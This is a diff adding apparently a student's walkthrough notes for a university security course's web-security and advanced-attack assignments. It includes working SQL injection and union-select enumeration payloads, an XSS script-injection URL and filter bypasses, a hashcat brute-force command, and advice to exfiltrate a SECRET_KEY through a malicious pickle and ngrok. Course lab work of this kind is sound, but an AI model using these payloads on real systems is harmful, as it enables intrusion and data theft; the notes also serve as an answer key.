@@ -462,3 +462,213 @@ In addition, the program MUST:
 * silently ignore malformed packets or those that are not using Ethernet, IP, and TCP.
 
 ## MP4: Web Security
+
+Objectives for this MP:
+* Learn to spot common vulnerabilities in websites and to avoid them in your own projects.
+* Understand the risks these problems pose and the weaknesses of naive defenses.
+* Gain experience with web architecture and with Python’s Bottle Framework, HTML, JavaScript, and SQL programming.
+
+### Checkpoint 1
+
+#### 4.1.1 Bungle Setup
+
+Follow setup instructions and setup Bungle! in your machine environment.
+
+#### 4.1.2 SQL
+
+Create appropriate SQL queries according to the specifications.
+
+#### 4.1.3 Prepared Statements
+
+Know how to make prepared statements in Python using *cur.execute()*. Implement them in *database.py*.
+
+#### 4.1.4 Input Sanitation
+
+Encode '<' and '>'. Implement them in *defenses.py*.
+
+#### 4.1.5 Token Validation
+
+Implement the given pseudocode in *defenses.py*:
+```
+token ← request’s cookie "csrf_token"
+if token is None
+	token ← a random 16 byte hexadecimal string
+endif
+token → response’s cookie "csrf_token"
+return token
+```
+
+### Checkpoint 2
+
+#### 4.2.1 SQL Injection
+
+*There is more than one way to solve each problem.*
+
+**4.2.1.1**: No defenses
+```
+username=victim; password=1’ OR ‘1’=‘1
+```
+**4.2.1.2**: Escapes single quotes by replacing them with double quotes.
+```
+username=victim; password=\’ OR “1”=“1”; -- 
+```
+*Note there is a space at the very end.*
+
+**4.2.1.3**: Escapes the username and applies the MD5 hash function to the password.
+
+Write a script that keeps generating a random string until its MD5 hash contains a substring ||1, ||2, ..., ||9, or or1, or2, ..., or9. Know why these are acceptable and not ||0 or or0. I implemented in Python, and the fastest it took was about 10 minutes, while the longest was a little more than an hour. Implementing in C may improve speed.
+
+**4.2.1.4**: A different database from the school VPN
+
+To find the name of database:
+
+	0' union select 1,2,3,database()#
+
+To find the version of SQL server:
+
+	0' union select 1,2,3,@@version#
+
+To find all the tables in the database:
+	
+	0' union select 1,2,3,group_concat(table_name separator ', ') from information_schema.tables where table_type='base table'#
+
+To find all columns in the HINT table:
+	
+	0' union select 1,2,3,group_concat(column_name separator ', ') from information_schema.columns where table_name='HINT'#
+
+To find the hint message:
+	
+	0' union select 1,2,3,group_concat(message separator ', ') from HINT#
+
+*Hint: go to table SECRET and get a secret string from row with your md5(netid)*
+
+To find all columns in the SECRET table:
+	
+	0' union select 1,2,3,group_concat(column_name separator ', ') from information_schema.columns where table_name='SECRET'#
+
+To find the secret string with md5(netid):
+	
+	0' union select 1,2,3,secret from SECRET where hash=md5('mschoi2')#
+
+#### 4.2.2 Cross-site Request Forgery (CSRF)
+
+**4.2.2.1**: No defenses
+
+Use **iframe** to load a page with attacker's credentials.
+
+**4.2.2.2**: Token validation
+
+Use **document.cookie()** to set a random token on top of **iframe**.
+
+#### 4.2.3 Cross-site Scripting (XSS)
+
+**4.2.3.1**: Warm-up XSS attack
+
+Make the link to redirect to http://www.ece.illinois.edu/.
+```
+http://trurl.cs.illinois.edu/multivac/index.php?name=
+<script>
+window.onload=function(){
+var url=document.getElementsByTagName("a");
+url[0].href="http://www.ece.illinois.edu/";}
+</script>
+```
+
+**4.2.3.2**: No defenses
+
+For 4.2.3.2 to 4.2.3.6, you are to implement a fake Bungle! website that is totally under your control and reports what the user is doing to a server you control, until the user leaves the site. Specifications:
+
+**Stealth:**
+* Display all pages correctly, with no significant evidence of attack.
+* Display normal URLs in the browser’s location bar, with no evidence of attack. (HTML5 History API)
+* Hide evidence of attack in the Bungle! search history view, as long as your code is running.
+
+**Persistence:**
+* Continue the attack if the user navigates to another page on the site by following a link or submitting a form, including by logging in or logging out.
+* Continue the attack if the user navigates to another Bungle! page by using the browser’s back or forward buttons.
+
+**Spying:**
+* Report all login and logout events by loading the URLs.
+* Report each page that is displayed (what the user thinks they’re seeing) by loading the URL.
+
+**4.2.3.3**: Remove "script"
+
+Replace script with scrscriptipt.
+
+**4.2.3.4**: Recursively removing "script"
+
+Use <img src...
+
+**4.2.3.5**: Recursively removing several tags
+
+Observe that the video tag is not removed. Use <video src=...
+
+**4.2.3.6**: Removes semicolons, single quotes, and double quotes
+
+Create a function that replaces these punctuations with their corresponding character code.
+
+## MP5: Advanced Concepts
+
+Objective for this MP:
+* Understand offensive techniques in real-world attacks.
+
+### Checkpoint 1
+
+#### 5.1.1 Reverse Engineering Intro
+
+*For Mac, I recommend using Hopper for a graphical disassembler.*
+
+**5.1.1.1**: *objdump* the application and find all the functions.
+
+**5.1.1.2**: Out of the functions you found, identify the netfilter hook function.
+
+**5.1.1.3**: Use a graphical disassembler to find what port number the netfilter hook function filters. There is only so many numbers that may be candidates for port numbers.
+
+**5.1.1.4**: Find what protocol the port number uses. Find the *keyword* of the protocol defined in RFC 1700.
+
+#### 5.1.2 Object Deserialization Attack
+
+Create any valid pickle file. Just follow a tutorial [here](https://wiki.python.org/moin/UsingPickle).
+
+#### 5.1.3 Double Withdrawal Attack
+
+Follow instructions to register your NetID, check balance, withdraw $1, and unregister your NetID.
+
+#### 5.1.4 Password Cracking Intro
+
+Given 3 SHA-1 password hashes, brute-force to find passwords. They're all 6 characters long, so it does not take long. *hashcat* seems to crack the fastest. Format:
+```
+hashcat64 -m 100 -a 3 5.1.4.hashes ?a?a?a?a?a?a
+```
+
+### Checkpoint 2
+
+#### 5.2.1 Port-knocking Attack
+
+**5.2.1.1**: Use *nmap* to identify the number of ports that need to be knocked.
+
+**5.2.1.2**: Reverse-engineer using a graphical disassembler and find the knocking sequence. Carefully observe a function that may have knocking sequence.
+
+**5.2.1.3**: Reverse-engineer using a graphical disassembler and find how long the filter port will be opened. There is only so many numbers that may be candidates for time. It is not in seconds, however.
+
+#### 5.2.2 Object Deserialization Attack
+
+**5.2.2.1**: Make a malicious pickle file that lists what files reside in the server and modify the pickle file to read Python scripts that may have SECRET_KEY. Use an communication channel to exfiltrate information. I recommend [ngrok](https://ngrok.com/).
+
+**5.2.2.2**: For me, SECRET_KEY resided in the Python script *server.py*. Find the variable.
+
+#### 5.2.3 Double Withdrawal Attack
+
+The server has a race condition vulnerability, which allows withdrawing extra money before it updates the balance. The clever way of doing this is to use two computers and withdraw at the same time. Do this for some time, and it will pop out the race condition token.
+
+#### 5.2.4 Password Cracking
+
+You are given 10,000 SHA-1 password hashes, and you are to crack as many as you can! I recommend using *hashcat* as it seems to crack them the fastest, or so I've heard. Here are some ways to crack them:
+1. Brute-force short passwords (maybe up to 7-8 characters long).
+2. Dictionary attack. Refer to Daniel Miessler's List [here](https://github.com/danielmiessler/SecLists/tree/master/Passwords).
+3. Rule-based attack. Incorporate rules, look for patterns.
+4. Use Markov modeling.
+
+There are possibly more ways to crack passwords. My partner and I could only crack about 8,000+.
+
+Be creative and have fun!
